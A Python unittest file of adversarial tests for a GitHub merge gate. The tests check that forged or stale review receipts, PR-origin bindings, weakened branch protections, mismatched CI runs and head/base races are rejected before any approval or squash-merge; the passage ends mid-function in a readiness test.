"""Adversarial admission tests; no network, credentials, checkout or API writes."""
import ast
import copy
import datetime as dt
import importlib.util
import json
import shlex
from pathlib import Path
import unittest
from unittest.mock import patch

SPEC = importlib.util.spec_from_file_location('reviewer_app', Path(__file__).resolve().parents[1] / 'scripts/reviewer_app.py')
gate = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(gate)
NOW = dt.datetime(2026, 11, 15, 12, tzinfo=dt.timezone.utc)

def fixture():
    current = dict(repository=gate.REPOSITORY, repository_id=gate.REPOSITORY_ID, head_sha='a'*40,
                   base_sha='b'*40, merge_base_sha='b'*40, diff_sha256='d'*64, policy_sha256='e'*64)
    producer = dict(id='personal-opaque', enabled=True, origin_account='origin-opaque',
                    github_user_id=gate.OWNER_ID, instructions_sha256='f'*64, cli_version='1.0', credential_store='keyring')
    review = dict(verdict='pass', coverage='complete', summary='No findings after full diff review.', findings=[], unresolved_findings=[])
    receipt = dict(schema='g1-local-review/v1', capture_id='00000000-0000-4000-8000-000000000001', trust_model='q16-operational-local',
        tuple=dict(current, origin_account=producer['origin_account']), reviewer_enrollment_id=producer['id'],
        reviewer_origin_account=producer['origin_account'], workspace_binding='owner-declared-enrollment',
        instructions_sha256=producer['instructions_sha256'], runtime=dict(status='completed', thread_id='fresh-thread-id',
        cli_version='1.0', credential_store='keyring', event_stream_sha256='c'*64, turn_id=None, startup_notice_sha256=[]),
        started_at='2026-11-15T11:00:00Z', completed_at='2026-11-15T11:30:00Z', review=review,
        report_sha256=gate.digest(gate.canonical(review)))
    comment = dict(id=1, user=dict(id=gate.OWNER_ID,type='User'), created_at='2026-11-15T11:31:00Z', updated_at='2026-11-15T11:31:00Z', body=gate.MARKER+json.dumps(receipt))
    return current, producer, receipt, comment

class ReceiptTests(unittest.TestCase):
    def setUp(self):
        self.current, self.producer, self.receipt, self.comment = fixture()
    def valid(self):
        gate.validate_receipt(self.receipt, self.producer, self.current, 'e'*64, NOW)
    def test_complete_current_receipt(self):
        self.valid()
    def test_missing_extra_and_wrong_typed_receipt_runtime_fields_refuse(self):
        for group in (None,'runtime','review'):
            original=self.receipt if group is None else self.receipt[group]
            for field in original:
                bad=copy.deepcopy(self.receipt);target=bad if group is None else bad[group];del target[field]
                with self.subTest(group=group,field=field),self.assertRaises(gate.Rejected):gate.validate_receipt(bad,self.producer,self.current,'e'*64,NOW)
            bad=copy.deepcopy(self.receipt);target=bad if group is None else bad[group];target['unexpected']='data'
            with self.assertRaises(gate.Rejected):gate.validate_receipt(bad,self.producer,self.current,'e'*64,NOW)
        for mutate in (lambda r:r.update(capture_id='invalid'),lambda r:r['runtime'].update(turn_id='invented'),lambda r:r['runtime'].update(event_stream_sha256=123)):
            bad=copy.deepcopy(self.receipt);mutate(bad)
            with self.assertRaises(gate.Rejected):gate.validate_receipt(bad,self.producer,self.current,'e'*64,NOW)
    def test_tuple_drift_every_field(self):
        for field in self.current:
            with self.subTest(field=field):
                receipt = copy.deepcopy(self.receipt)
                receipt['tuple'][field] = 'wrong'
                with self.assertRaises(gate.Rejected):
                    gate.validate_receipt(receipt,self.producer,self.current,'e'*64,NOW)
    def test_failed_partial_findings_stale_future_runtime_and_digest(self):
        mutations = [lambda r:r['review'].update(verdict='fail'),lambda r:r['review'].update(coverage='incomplete'),
            lambda r:r['review'].update(findings=[{'id':'P1'}]),lambda r:r['review'].update(unresolved_findings=['P1']),
            lambda r:r.update(started_at='2026-11-13T11:00:00Z'),lambda r:r.update(completed_at='2026-11-16T11:00:00Z'),
            lambda r:r['runtime'].update(status='running'),lambda r:r['runtime'].update(thread_id=''),
            lambda r:r['runtime'].update(credential_store='file'),lambda r:r['runtime'].update(startup_notice_sha256=['0'*64]),lambda r:r.update(report_sha256='0'*64),
            lambda r:r.update(instructions_sha256='0'*64),lambda r:r.update(reviewer_origin_account='other')]
        for mutation in mutations:
            with self.subTest(mutation=mutation):
                r=copy.deepcopy(self.receipt);mutation(r)
                with self.assertRaises(gate.Rejected):gate.validate_receipt(r,self.producer,self.current,'e'*64,NOW)
    def choose(self,comments,producers=None):
        return gate.choose_receipt(comments,{'producers':producers or [self.producer]},self.current,'e'*64,NOW,{'origin_account':self.producer['origin_account']})
    def test_owner_receipt_required_untrusted_sender_cannot_bind(self):
        bad=copy.deepcopy(self.comment);bad['user']['id']=999
        with self.assertRaises(gate.Rejected):self.choose([bad])
        self.assertEqual(self.choose([bad,self.comment]),self.receipt)
    def test_edited_unknown_oversized_receipts_fail_closed(self):
        for change in [dict(updated_at='2026-11-15T12:00:00Z'),dict(body=gate.MARKER+'x'*60000),dict(body=gate.MARKER+'{}')]:
            with self.subTest(change=str(change)[:70]):
                bad=dict(self.comment,**change)
                with self.assertRaises(gate.Rejected):self.choose([bad])
    def test_receipts_cannot_reassign_creation_origin(self):
        other=dict(self.producer,id='other-producer',origin_account='other-origin')
        second=copy.deepcopy(self.receipt);second.update(reviewer_enrollment_id=other['id'],reviewer_origin_account=other['origin_account']);second['tuple']['origin_account']=other['origin_account']
        with self.assertRaisesRegex(gate.Rejected,'frozen PR origin'):
            self.choose([dict(self.comment,id=2,body=gate.MARKER+json.dumps(second))],[self.producer,other])
        with self.assertRaisesRegex(gate.Rejected,'frozen PR origin'):
            self.choose([self.comment,dict(self.comment,id=2,body=gate.MARKER+json.dumps(second))],[self.producer,other])
    def test_latest_failed_review_supersedes_old_pass(self):
        failed=copy.deepcopy(self.receipt);failed['review']['verdict']='fail'
        with self.assertRaises(gate.Rejected):self.choose([self.comment,dict(self.comment,id=2,body=gate.MARKER+json.dumps(failed))])

class OriginTests(unittest.TestCase):
    def setUp(self):
        self.producer = dict(id='creator', enabled=True, origin_account='work-origin', github_user_id=gate.OWNER_ID,
            cli_version='1.0', credential_store='keyring', creation_adapter_sha256='a'*64, capture_adapter_sha256='b'*64)
        self.origin = dict(schema='g1-pr-origin/v1', trust_model='q16-operational-local',
            creation_id='00000000-0000-4000-8000-000000000001', repository=gate.REPOSITORY, repository_id=gate.REPOSITORY_ID,
            pull_request=7, pull_request_node_id='PR_7', github_user_id=gate.OWNER_ID, origin_account='work-origin',
            creator_enrollment_id='creator', workspace_binding='owner-declared-enrollment', initial_head_sha='c'*40,
            initial_base_sha='d'*40, pr_created_at='2026-11-15T11:00:01Z', started_at='2026-11-15T11:00:00Z',
            completed_at='2026-11-15T11:00:02Z', runtime=dict(cli_version='1.0', credential_store='keyring',
                account_checked_before=True, account_checked_after=True), creation_adapter_sha256='a'*64, capture_adapter_sha256='b'*64)
        self.pr = dict(number=7,node_id='PR_7',user={'id':gate.OWNER_ID,'type':'User'},created_at=self.origin['pr_created_at'],
            head={'repo':{'id':gate.REPOSITORY_ID}},base={'repo':{'id':gate.REPOSITORY_ID}},
            body='Description\n<!-- g1-pr-creation:'+self.origin['creation_id']+' -->')
        self.comment = dict(id=1,user={'id':gate.OWNER_ID,'type':'User'},created_at='2026-11-15T11:00:03Z',updated_at='2026-11-15T11:00:03Z')
    def choose(self, origin=None, comments=None):
        c=dict(self.comment,body=gate.ORIGIN_MARKER+json.dumps(self.origin if origin is None else origin))
        return gate.choose_origin([c] if comments is None else comments, {'producers':[self.producer]}, self.pr, NOW)
    def test_creation_binding_is_separate_and_survives_new_source_head(self):
        self.assertEqual(self.choose(),self.origin)
        self.pr['head']['sha']='e'*40;self.pr['base']['sha']='f'*40
        self.assertEqual(self.choose(),self.origin)
    def test_no_review_can_supply_missing_creation_binding(self):
        _,_,_,review_comment=fixture()
        for comments in ([],[review_comment]):
            with self.assertRaises(gate.Rejected):self.choose(comments=comments)
    def test_duplicate_edited_foreign_and_wrong_pr_binding_fail(self):
        c=dict(self.comment,body=gate.ORIGIN_MARKER+json.dumps(self.origin))
        for comments in ([c,c],[dict(c,updated_at='2026-11-15T11:02:00Z')],[dict(c,user={'id':999,'type':'User'})]):
            with self.assertRaises(gate.Rejected):self.choose(comments=comments)
        for key,value in [('number',8),('node_id','PR_OTHER'),('created_at','2026-11-15T10:00:00Z'),('body','No creation nonce')]:
            old=self.pr[key];self.pr[key]=value
            with self.assertRaises(gate.Rejected):self.choose()
            self.pr[key]=old
    def test_closed_schema_account_adapter_and_timing_fail_closed(self):
        for key in self.origin:
            bad=copy.deepcopy(self.origin);del bad[key]
            with self.subTest(missing=key),self.assertRaises(gate.Rejected):self.choose(bad)
        changes=[('origin_account','personal-origin'),('creator_enrollment_id','other'),('creation_adapter_sha256','c'*64),
            ('capture_adapter_sha256','c'*64),('repository_id',True),('pull_request',True),('trust_model','signed'),
            ('initial_head_sha','bad'),('started_at','2026-11-15T10:00:00Z'),('completed_at','2026-11-15T11:20:00Z'),
            ('runtime',dict(self.origin['runtime'],account_checked_after=False))]
        for key,value in changes:
            bad=copy.deepcopy(self.origin);bad[key]=value
            with self.subTest(field=key),self.assertRaises(gate.Rejected):self.choose(bad)
        bad=dict(self.origin,extra='untrusted')
        with self.assertRaises(gate.Rejected):self.choose(bad)

class APIAndControlsTests(unittest.TestCase):
    def test_write_payload_declares_json_content_type(self):
        from unittest.mock import Mock
        response=Mock();response.read.return_value=b'{}'
        response.__enter__=Mock(return_value=response);response.__exit__=Mock(return_value=False)
        with patch.object(gate.urllib.request,'urlopen',return_value=response) as opened:
            gate.API('fixture',writable=True).request('/graphql','POST',{'query':'fixture'})
        request=opened.call_args.args[0]
        self.assertEqual(request.get_header('Content-type'),'application/json')
        self.assertEqual(request.data,b'{"query":"fixture"}')
    def test_readonly_rejects_post_without_network(self):
        with self.assertRaises(gate.Rejected):gate.API('fake').request('/graphql','POST',{})
    def test_readonly_allows_only_fixed_merge_query(self):
        from unittest.mock import Mock
        response=Mock();response.read.return_value=b'{}'
        response.__enter__=Mock(return_value=response);response.__exit__=Mock(return_value=False)
        api=gate.API('fixture')
        with patch.object(gate.urllib.request,'urlopen',return_value=response) as opened:
            api.request('/graphql','POST',{'query':gate.MERGE_SETTINGS_QUERY})
            self.assertEqual(opened.call_count,1)
            for path,method,data in [('/graphql','POST',{'query':'mutation { unsafe }'}),
                ('/graphql','POST',{'query':gate.MERGE_SETTINGS_QUERY,'variables':{}}),
                ('/repos/other','POST',{'query':gate.MERGE_SETTINGS_QUERY}),
                ('/graphql','PATCH',{'query':gate.MERGE_SETTINGS_QUERY})]:
                with self.assertRaises(gate.Rejected):api.request(path,method,data)
            self.assertEqual(opened.call_count,1)
    def merge_response(self):
        return {'data':{'repository':{'databaseId':gate.REPOSITORY_ID,'nameWithOwner':gate.REPOSITORY,
            'mergeCommitAllowed':False,'rebaseMergeAllowed':False,'squashMergeAllowed':True,'autoMergeAllowed':True}}}
    def test_readonly_redacted_rest_merge_settings_are_validated(self):
        repo,rules,sets=self.controls()
        redacted={k:v for k,v in repo.items() if not k.startswith('allow_')}
        api=gate.API('fixture')
        with patch.object(api,'request',side_effect=[redacted,self.merge_response()]) as request:
            observed=gate.repository_snapshot(api)
        self.assertEqual(observed,repo)
        request.assert_any_call('/graphql','POST',{'query':gate.MERGE_SETTINGS_QUERY})
        gate.validate_controls(observed,rules,sets)
    def test_merge_query_missing_errors_identity_type_drift_and_disagreement_fail(self):
        good=self.merge_response()
        responses=[{}, {'data':None}, {'data':{'repository':None}}, dict(good,errors=[{'message':'denied'}])]
        for field,value in [('databaseId',1),('nameWithOwner','other/repo'),('autoMergeAllowed',None),
                            ('mergeCommitAllowed',0),('squashMergeAllowed','true')]:
            bad=copy.deepcopy(good);bad['data']['repository'][field]=value;responses.append(bad)
        for result in responses:
            with patch.object(gate.API,'request',side_effect=[{},result]):
                with self.assertRaises(gate.Rejected):gate.repository_snapshot(gate.API('fixture'))
        with patch.object(gate.API,'request',side_effect=[{'allow_auto_merge':False},good]):
            with self.assertRaisesRegex(gate.Rejected,'between reads'):gate.repository_snapshot(gate.API('fixture'))
    def test_graphql_merge_setting_still_must_meet_controls(self):
        repo,rules,sets=self.controls()
        redacted={k:v for k,v in repo.items() if not k.startswith('allow_')}
        for field in ('mergeCommitAllowed','rebaseMergeAllowed','squashMergeAllowed','autoMergeAllowed'):
            bad=self.merge_response();bad['data']['repository'][field]=not bad['data']['repository'][field]
            with patch.object(gate.API,'request',side_effect=[dict(redacted),bad]):
                observed=gate.repository_snapshot(gate.API('fixture'))
            with self.assertRaisesRegex(gate.Rejected,'merge methods'):gate.validate_controls(observed,rules,sets)
    def test_pagination_reads_past_first_page(self):
        api=gate.API('fake')
        with patch.object(api,'request',side_effect=[{'jobs':list(range(100))},{'jobs':[100]}]) as request:
            self.assertEqual(len(api.pages('/jobs','jobs')),101)
            self.assertIn('page=2',request.call_args.args[0])
    def test_pagination_never_silently_truncates(self):
        api=gate.API('fake')
        with patch.object(api,'request',return_value=[{}]*100):
            with self.assertRaises(gate.Rejected):api.pages('/things')
    def controls(self):
        repo=dict(id=gate.REPOSITORY_ID,full_name=gate.REPOSITORY,default_branch='main',private=False,
                  allow_squash_merge=True,allow_merge_commit=False,allow_rebase_merge=False,allow_auto_merge=True)
        rules=[dict(type='required_status_checks',ruleset_id=1,parameters=dict(strict_required_status_checks_policy=True,required_status_checks=[dict(context='ci-required',integration_id=15368)])),
               dict(type='pull_request',ruleset_id=1,parameters=dict(required_approving_review_count=1,dismiss_stale_reviews_on_push=True,required_review_thread_resolution=True,allowed_merge_methods=['squash'])),
               dict(type='required_linear_history',ruleset_id=1),dict(type='deletion',ruleset_id=1),dict(type='non_fast_forward',ruleset_id=1)]
        return repo,rules,[dict(id=1,enforcement='active',bypass_actors=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='pull_request')])]
    def test_control_positive(self):gate.validate_controls(*self.controls())
    def test_owner_admin_pr_only_exception_preserved(self):
        repo,rules,sets=self.controls();sets[0]['bypass_actors']=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='pull_request')]
        gate.validate_controls(repo,rules,sets)
    def test_app_redacted_bypass_is_not_treated_as_empty(self):
        repo,rules,sets=self.controls();del sets[0]['bypass_actors']
        gate.validate_controls(repo,rules,sets)
    def test_no_protection_gap_or_producer_substitution(self):
        mutations=[lambda r,q,s:r.update(allow_merge_commit=True),lambda r,q,s:q[0]['parameters'].update(strict_required_status_checks_policy=False),
                   lambda r,q,s:q[0]['parameters']['required_status_checks'][0].update(integration_id=4274739),
                   lambda r,q,s:q[1]['parameters'].update(dismiss_stale_reviews_on_push=False),
                   lambda r,q,s:s[0].update(bypass_actors=[{'actor_id':5}]),lambda r,q,s:s[0].update(enforcement='evaluate')]
        for mutation in mutations:
            args=self.controls();mutation(*args)
            with self.assertRaises(gate.Rejected):gate.validate_controls(*args)

class DeliveryTests(unittest.TestCase):
    def proof(self):
        return {'tuple':{'head_sha':'a'*40,'base_sha':'b'*40},'node_id':'PR_node','merge_sha':'c'*40}
    def live_pr(self, state='blocked'):
        return {'node_id':'PR_node','number':1,'state':'open','merged':False,'draft':False,
                'head':{'sha':'a'*40,'repo':{'id':gate.REPOSITORY_ID}},
                'base':{'sha':'b'*40,'ref':'main','repo':{'id':gate.REPOSITORY_ID}},
                'mergeable':True,'mergeable_state':state}
    def fake_apis(self):
        read=gate.API('fake');write=gate.API('fake',writable=True)
        read.request=lambda path: ({'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'} if path.startswith('/users/') else
                                  {'object':{'sha':'b'*40}} if path.endswith('/git/ref/heads/main') else self.live_pr())
        write.pages=lambda *args:[{'id':gate.REPOSITORY_ID,'full_name':gate.REPOSITORY}]
        return read,write
    def test_disabled_means_no_mutation(self):
        read,write=self.fake_apis()
        with patch.object(write,'request') as request:
            with self.assertRaises(gate.Rejected):gate.deliver(read,write,1,{'enabled':False},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()
    def test_base_race_before_approval_prevents_all_writes(self):
        read,write=self.fake_apis()
        with patch.object(gate,'snapshot',side_effect=[{'base':'old'},{'base':'new'}]),patch.object(write,'request') as request:
            with self.assertRaisesRegex(gate.Rejected,'before approval'):gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()
    def test_base_race_after_approval_never_arms(self):
        read,write=self.fake_apis();proof=self.proof()
        with patch.object(gate,'snapshot',side_effect=[proof,proof,dict(proof,changed=True)]),patch.object(write,'request',return_value={'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}}) as request:
            with self.assertRaisesRegex(gate.Rejected,'after approval'):gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(request.call_count,1)
            self.assertEqual(request.call_args.args[2]['commit_id'],'a'*40)
    def test_success_writes_exact_head_then_native_squash_only(self):
        read,write=self.fake_apis();proof=self.proof()
        replies=[{'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}},
                 {'data':{'enablePullRequestAutoMerge':{'pullRequest':{'autoMergeRequest':{'mergeMethod':'SQUASH'}}}}}]
        with patch.object(gate,'snapshot',return_value=proof) as snapshot,patch.object(write,'request',side_effect=replies) as request:
            result=gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(result,{'status':'armed','head_sha':'a'*40,'merged':False})
            self.assertEqual(snapshot.call_count,3)
            self.assertEqual(request.call_count,2)
            self.assertEqual(request.call_args_list[0].args[2]['commit_id'],'a'*40)
            payload=request.call_args_list[1].args[2]
            self.assertIn('$input:EnablePullRequestAutoMergeInput!',payload['query'])
            self.assertIn('enablePullRequestAutoMerge(input:$input)',payload['query'])
            self.assertEqual(payload['variables'],{'input':{'pullRequestId':'PR_node','expectedHeadOid':'a'*40,'mergeMethod':'SQUASH'}})
    def test_head_mismatch_and_graphql_errors_never_report_armed_or_retry(self):
        proof=self.proof()
        approved={'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}}
        for response in ({'errors':[{'message':'head changed','type':'UNPROCESSABLE'}]},
                         {'errors':[{'message':'other failure'}],'data':{'enablePullRequestAutoMerge':None}},
                         {}, {'data':None}, {'data':{'enablePullRequestAutoMerge':{'pullRequest':None}}},
                         {'data':{'enablePullRequestAutoMerge':{'pullRequest':{'autoMergeRequest':{'mergeMethod':'MERGE'}}}}}):
            with self.subTest(response=response):
                read,write=self.fake_apis()
                def mutate(path,method,data):
                    if path=='/graphql':
                        # Simulate GitHub observing a head race after our last read.
                        self.assertEqual(data['variables']['input']['expectedHeadOid'],proof['tuple']['head_sha'])
                        return response
                    return approved
                with patch.object(gate,'snapshot',return_value=proof),patch.object(write,'request',side_effect=mutate) as request:
                    with self.assertRaisesRegex(gate.Rejected,'native auto-merge not confirmed'):
                        gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
                    self.assertEqual(request.call_count,2)
    def clean_apis(self):
        read,write=self.fake_apis();original=read.request;writes=[]
        def request(path):
            merged=len(writes)==2
            if path.endswith('/pulls/1'):
                pr=self.live_pr('clean')
                if merged:
                    pr.update(state='closed',merged=True,merge_commit_sha='d'*40,
                              merged_by={'id':gate.BOT_ID,'login':gate.APP_SLUG+'[bot]'})
                return pr
            if path.endswith('/git/ref/heads/main'):
                return {'object':{'sha':('d' if merged else 'b')*40}}
            if '/git/commits/' in path:
                return {'parents':[{'sha':'b'*40}],'tree':{'sha':'e'*40}}
            return original(path)
        def mutate(path,method,data):
            writes.append((path,method,data))
            if path=='/graphql':
                return {'data':{'mergePullRequest':{'pullRequest':{'id':'PR_node','merged':True,'mergeCommit':{'oid':'d'*40}}}}}
            return {'state':'APPROVED','commit_id':'a'*40,'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
        read.request=request;write.request=mutate
        return read,write,writes
    def test_clean_native_squash_verifies_app_actor_parent_tree_and_main(self):
        read,write,writes=self.clean_apis()
        with patch.object(gate,'snapshot',return_value=self.proof()) as snapshot:
            result=gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
        self.assertEqual(snapshot.call_count,3)
        self.assertEqual(result,{'status':'merged','head_sha':'a'*40,'merged':True,'merge_sha':'d'*40,'base_sha':'b'*40})
        self.assertEqual(len(writes),2)
        self.assertEqual(writes[0][2]['event'],'APPROVE')
        self.assertIn('mergePullRequest(input:$input)',writes[1][2]['query'])
        self.assertNotIn('enablePullRequestAutoMerge',writes[1][2]['query'])
        self.assertEqual(writes[1][2]['variables']['input'],{'pullRequestId':'PR_node','expectedHeadOid':'a'*40,'mergeMethod':'SQUASH'})
    def test_clean_error_never_falls_back_to_arm_or_retries(self):
        for response in ({'errors':[{'type':'UNPROCESSABLE','message':'private arbitrary text'}]}, {},
                         {'data':{'mergePullRequest':{'pullRequest':None}}}):
            read,write,writes=self.clean_apis();original=write.request
            def mutate(path,method,data):
                if path=='/graphql':
                    writes.append((path,method,data));return response
                return original(path,method,data)
            write.request=mutate
            with patch.object(gate,'snapshot',return_value=self.proof()):
                with self.assertRaises(gate.Rejected) as error:
                    gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertNotIn('private arbitrary text',str(error.exception))
            self.assertEqual(len(writes),2)
    def test_changed_unknown_or_nonready_native_state_never_merges(self):
        mutations=[lambda p,s=s:p.update(mergeable_state=s) for s in ('behind','unstable','dirty','unknown',None)]
        mutations += [lambda p:p.update(mergeable=None),lambda p:p.update(merged=True),lambda p:p.update(draft=True),
                      lambda p:p['head'].update(sha='f'*40),lambda p:p['base'].update(sha='f'*40),
                      lambda p:p['base']['repo'].update(id=99)]
        for mutation in mutations:
            read,write,writes=self.clean_apis();original=read.request
            def request(path):
                value=original(path)
                if path.endswith('/pulls/1'):mutation(value)
                return value
            read.request=request
            with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaisesRegex(gate.Rejected,'native delivery state drift'):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(len(writes),1)
    def test_merge_confirmation_cannot_claim_unverified_or_foreign_delivery(self):
        for defect in ('open','wrong_actor','wrong_head','wrong_parent','wrong_tree','wrong_main'):
            read,write,writes=self.clean_apis();original=read.request
            def request(path):
                value=original(path)
                if len(writes)==2:
                    if path.endswith('/pulls/1'):
                        if defect=='open':value['merged']=False
                        if defect=='wrong_actor':value['merged_by']['id']=gate.OWNER_ID
                        if defect=='wrong_head':value['head']['sha']='f'*40
                    if path.endswith('/git/commits/'+'d'*40):
                        if defect=='wrong_parent':value['parents']=[{'sha':'f'*40}]
                        if defect=='wrong_tree':value['tree']['sha']='f'*40
                    if defect=='wrong_main':
                        if path.endswith('/git/ref/heads/main'):value['object']['sha']='f'*40
                        if '/compare/' in path:value={'merge_base_commit':{'sha':'b'*40}}
                return value
            read.request=request
            with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaisesRegex(gate.Rejected,'read-only reconciliation'):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(len(writes),2)
    def test_base_moves_after_final_snapshot_prevents_delivery_write(self):
        read,write,writes=self.clean_apis();original=read.request
        read.request=lambda path: {'object':{'sha':'f'*40}} if path.endswith('/git/ref/heads/main') else original(path)
        with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaisesRegex(gate.Rejected,'native delivery state drift'):
            gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
        self.assertEqual(len(writes),1)
    def test_visible_owner_exception_cannot_disappear_or_duplicate(self):
        for history_only in (False,True):
            repo,rules,sets=APIAndControlsTests().controls()
            if history_only:
                rules += [dict(type=name,ruleset_id=2) for name in ('deletion','non_fast_forward')]
                sets += [dict(id=2,enforcement='active',rules=[{'type':name} for name in ('deletion','non_fast_forward')],
                              bypass_actors=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='always')])]
            target=sets[-1]
            for actors in ([],target['bypass_actors']*2,{},None):
                with self.subTest(history_only=history_only,actors=actors):
                    changed=copy.deepcopy(sets);changed[-1]['bypass_actors']=actors
                    with self.assertRaises(gate.Rejected):
                        gate.validate_controls(repo,rules,changed)
            del target['bypass_actors']
            gate.validate_controls(repo,rules,sets)
    def test_other_app_or_multirepo_token_cannot_write(self):
        read,write=self.fake_apis();write.pages=lambda *args:[{'id':gate.REPOSITORY_ID},{'id':99}]
        with patch.object(write,'request') as request:
            with self.assertRaises(gate.Rejected):gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()

class CITests(unittest.TestCase):
    def fixture(self):
        pr={'number':1,'head':{'sha':'a'*40},'base':{'sha':'b'*40}}
        run={'id':10,'run_attempt':2,'status':'completed','conclusion':'success','event':'pull_request',
             'head_sha':'a'*40,'repository':{'id':gate.REPOSITORY_ID},'head_repository':{'id':gate.REPOSITORY_ID},
             'pull_requests':[{'number':1,'head':{'sha':'a'*40},'base':{'sha':'b'*40}}], 'check_suite_id':50}
        jobs=[{'id':i,'name':name,'status':'completed','conclusion':'success','run_id':10,
               'check_run_url':'https://api.github.com/check-runs/'+str(i)} for i,name in enumerate(gate.CI_JOBS,1)]
        checks={str(i):{'name':job['name'],'app':{'id':15368},'status':'completed','conclusion':'success',
                       'head_sha':'a'*40,'check_suite':{'id':50}} for i,job in enumerate(jobs,1)}
        api=gate.API('fake')
        api.request=lambda path:({'id':5,'path':'.github/workflows/ci.yml','state':'active'} if path.endswith('ci.yml') else checks[path.rsplit('/',1)[-1]])
        api.pages=lambda path,key:([run] if key=='workflow_runs' else jobs)
        api.job_log=lambda job:self.log(pr,run)
        return api,pr,run,jobs,checks
    def log(self,pr,run):
        identity={'repository':gate.REPOSITORY,'repository_id':str(gate.REPOSITORY_ID),'event':'pull_request',
                  'revision':'c'*40,'workflow_sha':'c'*40,'run_id':str(run['id']),'run_attempt':str(run['run_attempt']),
                  'ref':'refs/pull/1/merge','head_sha':'a'*40,'base_sha':'b'*40,
                  'workflow_ref':gate.REPOSITORY+'/.github/workflows/ci.yml@refs/pull/1/merge','workflow':'CI'}
        return '2026-11-15T12:00:00.1234567Z MACHINE_MONITOR_CI_AGGREGATE_V1 '+json.dumps({'schema':'machine-monitor-ci-aggregate/v1','identity':identity,'result':'success'})
    def test_immutable_log_tuple_required(self):
        api,pr,run,_,_=self.fixture();valid=self.log(pr,run)
        for bad in ('no marker',valid+'\n'+valid,valid.replace('b'*40,'d'*40),valid.replace('"run_attempt": "2"','"run_attempt": "1"'),valid.replace('c'*40,'f'*40)):
            with self.subTest(log=bad[:90]):
                with self.assertRaises(gate.Rejected):gate.validate_ci_log(bad,pr,'c'*40,run)
    def test_current_attempt_and_all_shards(self):
        api,pr,_,_,_=self.fixture()
        self.assertEqual(gate.validate_ci(api,'/repos/'+gate.REPOSITORY,pr,'c'*40),(10,2))
    def test_stale_wrong_producer_missing_skipped_failed_ci(self):
        mutations=[lambda run,jobs,checks:run['pull_requests'][0]['base'].update(sha='x'*40),
            lambda run,jobs,checks:run.update(conclusion='failure'),
            lambda run,jobs,checks:run.update(status='in_progress'),
            lambda run,jobs,checks:run['head_repository'].update(id=999),
            lambda run,jobs,checks:jobs.pop(),
            lambda run,jobs,checks:jobs[0].update(conclusion='skipped'),
            lambda run,jobs,checks:checks['3']['app'].update(id=4274739),
            lambda run,jobs,checks:checks['3']['check_suite'].update(id=51),
            lambda run,jobs,checks:checks['3'].update(head_sha='x'*40)]
        for mutation in mutations:
            api,pr,run,jobs,checks=self.fixture();mutation(run,jobs,checks)
            with self.assertRaises(gate.Rejected):gate.validate_ci(api,'/repos/'+gate.REPOSITORY,pr,'c'*40)
    def test_newer_failed_run_blocks_older_success(self):
        api,pr,run,jobs,_=self.fixture();failed=dict(run,id=11,conclusion='failure')
        api.pages=lambda path,key:([run,failed] if key=='workflow_runs' else jobs)
        with self.assertRaises(gate.Rejected):gate.validate_ci(api,'/repos/'+gate.REPOSITORY,pr,'c'*40)

class ReadinessTests(unittest.TestCase):
    def test_bootstrap_requires_both_exact_legacy_blockers_but_delivery_does_not(self):
        repo,rules,sets=APIAndControlsTests().controls()
        gate.validate_controls(repo,rules,sets)
        with self.assertRaisesRegex(gate.Rejected,'both legacy blockers'):
            gate.validate_controls(repo,rules,sets,require_legacy=True)
        required=rules[0]['parameters']['required_status_checks']
        for name in ('pr-automation / verify','pr-automation / job:repo.machine-monitor.m3-verify'):
            required.append({'context':name,'integration_id':4274739})
        gate.validate_controls(repo,rules,sets,require_legacy=True)
        for index in (1,2):
            bad=copy.deepcopy(rules);bad[0]['parameters']['required_status_checks'][index]['integration_id']=15368
            with self.assertRaises(gate.Rejected):gate.validate_controls(repo,bad,sets,require_legacy=True)
    def fixture(self):
        read, _, run, jobs, checks = CITests().fixture()
        revision = 'c'*40
        run.update(event='push', head_sha=revision, head_branch='main', pull_requests=[])
        for check in checks.values():
            check['head_sha'] = revision
        old_request = read.request
        read.request = lambda path: ({'object': {'sha': revision}} if path.endswith('/git/ref/heads/main') else
            {'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'} if path.startswith('/users/') else old_request(path))
        identity = {'repository':gate.REPOSITORY, 'repository_id':str(gate.REPOSITORY_ID), 'event':'push',
            'revision':revision, 'workflow_sha':revision, 'run_id':'10', 'run_attempt':'2',
            'ref':'refs/heads/main', 'head_sha':'', 'base_sha':'',
            'workflow_ref':gate.REPOSITORY+'/.github/workflows/ci.yml@refs/heads/main','workflow':'CI'}
        read.job_log=lambda job: 'MACHINE_MONITOR_CI_AGGREGATE_V1 '+json.dumps({'schema':'machine-monitor-ci-aggregate/v1','identity':identity,'result':'success'})
        app=gate.API('fake')
